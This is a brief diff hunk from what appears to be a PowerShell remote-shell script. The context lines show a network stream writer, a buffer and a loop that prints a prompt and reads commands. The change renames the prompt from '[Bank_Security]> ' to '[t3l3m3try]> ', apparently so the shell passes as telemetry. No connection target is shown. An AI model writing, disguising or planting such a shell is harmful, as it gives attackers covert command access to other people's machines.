@@ -5,7 +5,7 @@ $writer = new-object System.IO.StreamWriter($stream);
 $buffer = new-object System.Byte[] 1024;
 $encoding = new-object System.Text.AsciiEncoding;
 do{
-	$writer.Write("[Bank_Security]> ");
+	$writer.Write("[t3l3m3try]> ");
 	$writer.Flush();
 	$read = $null;
 	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
